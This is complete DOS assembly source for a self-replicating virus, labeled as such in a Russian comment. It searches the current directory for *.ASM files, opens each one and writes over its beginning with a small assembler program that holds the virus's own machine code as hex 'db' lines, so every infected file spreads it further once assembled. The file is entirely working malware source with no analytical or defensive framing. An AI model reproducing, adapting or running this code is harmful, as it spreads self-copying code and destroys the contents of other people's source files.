;
; Вирус, заражающий ассемблерные исходники 
; (c) ALL
;
cseg	segment
	assume   cs:cseg, ds:cseg, ss:cseg
	org	80h
Dta     db	15h dup (?)
Attrib  db	0           
Time    dw	0          
Date    dw	0           
Fsize   dd	0         
FName   db	0Eh dup (?)
	org	100h
Start:
	mov	ah, 4Eh       
Repeat:		
	lea	dx, Maska
	sub	cx, cx
        int     21h          
        jc      NoMore 	     
        call    Infect
	mov	ah,4Fh        
	jmp     short Repeat
NoMore:
        ret
Infect:
	mov	ax,3D02h                
	mov	dx,offset FName       
	int	21h                   
	mov	bx,ax
	mov	cx, Text2-Text1
	mov	dx, offset Text1
	call	WriF
	mov	cx, 3
	mov	dx, offset DefByt
	call	WriF
	mov	si, offset Start
	sub	bp, bp
WriDig:
	lodsb
	call	GenNum
	mov	cx, 4
	mov	dx, offset NumBuf
	call	WriF
	inc	bp
	cmp	bp, Finish-Start
	jae	Done
	mov	ax, bp
	mov	cl, 12
	sub	dx, dx
	div	cl
	or	ah, ah
	jz	WrCrLf
	mov	dx, offset Comma
	mov	cx, 2
	jmp	short WrDelim
WrCrLf:
	mov	cx, 5
	mov	dx, offset CrLf			
WrDelim:
	call	WriF
	jmp	short WriDig
Done:
	mov	ah, 40h
	mov	cx, Finish-Text2
	mov	dx, offset Text2
	int	21h
        mov     ah, 3Eh   
        int     21h
        ret
GenNum:
	mov	di, offset NumBuf+1
	mov	cl, 16
	sub	dx, dx
	div	cl
	call	GenDig
	xchg	ah, al
	call	GenDig
	ret
GenDig:
	cmp	al, 10
	jae	Hex
Decim:
	add	al, '0'
	stosb
	ret
Hex:
	add	al, 'a'-10
	stosb
	ret	
WriF:
	mov	ah, 40h
	int	21h
	ret
;	
Comma	db	', '
CrLf	db	13,10
DefByt	db	'db '
NumBuf	db	'000h'	
Maska   db	'*.ASM',0
Text1	db	'.model tiny',13,10
	db	'.code',13,10
	db	'org 100h',13,10
	db	'start:',13,10
Text2	db	13,10,'end start',13,10
Finish:
cseg	ends 
	end      Start
